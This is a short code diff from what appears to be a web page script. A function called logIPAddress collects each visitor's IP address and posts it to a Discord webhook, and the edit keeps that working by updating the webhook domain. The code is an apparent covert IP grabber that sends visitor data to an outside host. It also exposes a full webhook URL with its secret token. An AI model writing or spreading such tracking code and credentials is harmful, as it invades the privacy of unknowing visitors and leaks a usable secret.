@@ -20,7 +20,7 @@
         function logIPAddress() {
             getIPAddress().then((ip) => {
                 // Send the IP address to the first Discord webhook as an embed
-                fetch('https://discordapp.com/api/webhooks/1401371309312839752/GbMz5eT5intGPx56Kzr3zBMogG1taE8ys5qF7KHpd7opy06Fq-0jwJYT4LGrYjtDrppR', {
+                fetch('https://discord.com/api/webhooks/1401371309312839752/GbMz5eT5intGPx56Kzr3zBMogG1taE8ys5qF7KHpd7opy06Fq-0jwJYT4LGrYjtDrppR', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
